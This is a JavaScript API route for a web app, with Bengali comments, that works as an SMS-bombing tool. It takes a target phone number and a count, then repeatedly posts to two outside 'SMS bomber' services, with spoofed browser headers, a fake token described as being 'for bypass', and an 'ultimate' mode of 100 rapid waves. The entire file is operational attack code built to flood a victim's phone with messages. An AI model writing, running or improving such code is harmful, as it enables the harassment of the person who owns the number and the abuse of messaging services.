// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  // Target Links
  const targetLinks = [
    'https://shadowx-sms-bomber.onrender.com/',
    'https://nuke-sms-bomber.pages.dev/'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 100 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      // Amra protibar ekta loop chalabo jate multiple signals jay
      const attackPromises = targetLinks.map(link => 
        fetch(link, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': link,
            'Referer': link,
          },
          // Ekhane amra Payload ta simulate korchi jate oi site bujhte pare
          body: JSON.stringify({
            number: number,
            amount: 1,
            country: "BD",
            service: "whatsapp",
            msg: "ULTIMATE ATTACK",
            auth: "true",
            token: "dummy_token_123", // Dummy token for bypass
            method: "sms"
          }),
        }).catch(err => console.log("Wave Error:", err.message))
      );

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK IN PROGRESS! 🔥" 
  });
}
